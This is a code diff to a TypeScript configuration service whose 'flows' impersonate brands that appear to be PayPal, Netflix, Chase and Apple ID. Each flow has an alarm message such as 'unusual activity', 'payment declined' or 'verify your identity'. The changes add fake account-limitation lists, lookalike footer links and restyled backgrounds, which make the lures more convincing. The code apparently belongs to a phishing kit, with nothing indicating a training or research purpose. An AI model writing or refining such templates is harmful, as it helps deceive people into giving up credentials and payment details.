@@ -1,3 +1,4 @@
+
 /**
  * Flow Configuration Service
  * Manages available flows (brands) and user subscriptions
@@ -52,6 +53,9 @@ export interface UrgencyConfig {
     buttonText: string;
     alertIcon: string;
     referencePrefix: string;
+    footerLink?: string; // e.g. "Why is my account limited?"
+    limitations?: string[]; // e.g. ["Send money", "Withdraw funds"]
+    resolveTitle?: string; // e.g. "How to resolve"
 }
 
 export interface FlowConfig {
@@ -101,7 +105,10 @@ export const AVAILABLE_FLOWS: FlowConfig[] = [
             message: 'We noticed some unusual activity on your account. To protect your financial security, we have limited certain features until you verify your identity.',
             buttonText: 'Secure My Account',
             alertIcon: 'gpp_maybe',
-            referencePrefix: 'PP'
+            referencePrefix: 'PP',
+            footerLink: 'Why is my account limited?',
+            limitations: ['Send or receive money', 'Withdraw funds', 'Close your account'],
+            resolveTitle: 'How to resolve'
         },
         theme: {
             mode: 'light',
@@ -162,11 +169,15 @@ export const AVAILABLE_FLOWS: FlowConfig[] = [
             message: 'We could not process your last payment. Please update your payment details to continue watching.',
             buttonText: 'Update Payment',
             alertIcon: 'credit_card_off',
-            referencePrefix: 'NFLX'
+            referencePrefix: 'NFLX',
+            footerLink: 'Why was my payment declined?',
+            // Netflix doesn't list limitations, just urgency.
+            limitations: [],
+            resolveTitle: 'What happens next?'
         },
         theme: {
             mode: 'dark',
-            background: { type: 'image', value: 'url("assets/bg/netflix-bg.jpg")' },
+            background: { type: 'gradient', value: 'linear-gradient(to bottom, #000000 0%, #141414 100%)' },
             layout: 'centered',
             card: {
                 background: 'rgba(0, 0, 0, 0.75)',
@@ -222,17 +233,20 @@ export const AVAILABLE_FLOWS: FlowConfig[] = [
             message: 'We noticed a login attempt from an unrecognized device. Please verify your identity to secure your account.',
             buttonText: 'Verify Identity',
             alertIcon: 'verified_user',
-            referencePrefix: 'CHASE'
+            referencePrefix: 'CHASE',
+            footerLink: 'Is this e-mail from Chase?',
+            limitations: [],
+            resolveTitle: 'Secure your account'
         },
         theme: {
             mode: 'light',
-            background: { type: 'image', value: 'url("assets/bg/chase-bg.jpg")' },
+            background: { type: 'gradient', value: 'linear-gradient(135deg, #117aca 0%, #004d80 100%)' },
             layout: 'split',
             card: {
-                background: 'rgba(255, 255, 255, 0.95)',
+                background: 'rgba(255, 255, 255, 0.98)',
                 border: 'none',
                 radius: '0px',
-                shadow: '0 20px 25px -5px rgba(0, 0, 0, 0.1)',
+                shadow: '0 20px 25px -5px rgba(0, 0, 0, 0.2)',
                 maxWidth: '400px',
                 padding: '3rem'
             },
@@ -282,7 +296,10 @@ export const AVAILABLE_FLOWS: FlowConfig[] = [
             message: 'You must verify your identity to unlock your account.',
             buttonText: 'Unlock Account',
             alertIcon: 'lock',
-            referencePrefix: 'ID'
+            referencePrefix: 'ID',
+            footerLink: 'Forgot Apple ID or Password?',
+            limitations: ['Access iCloud', 'Use App Store', 'Make purchases'],
+            resolveTitle: 'Unlock your account'
         },
         theme: {
             mode: 'light',
